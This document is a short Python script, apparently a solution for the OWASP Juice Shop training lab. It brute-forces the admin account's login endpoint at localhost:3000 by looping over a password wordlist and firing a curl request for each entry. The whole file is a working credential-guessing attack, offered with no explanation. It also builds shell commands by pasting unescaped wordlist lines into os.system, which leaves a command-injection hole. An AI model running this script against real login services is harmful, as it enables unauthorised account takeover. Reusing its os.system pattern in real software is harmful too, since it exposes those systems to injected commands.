import os
     
with open("best1050.txt") as f:
        lines = f.readlines()
        for line in lines:
            line = line.replace("\n","")
            print("\nTrying " + line)
            
            os.system("curl 'http://localhost:3000/rest/user/login' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: application/json, text/plain, */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/json' -H 'Origin: http://localhost:3000' -H 'Connection: keep-alive' -H 'Referer: http://localhost:3000/' -H 'Cookie: language=en; welcomebanner_status=dismiss' --data-raw '{\"email\":\"admin@juice-sh.op\",\"password\":\"" + line + "\"}'")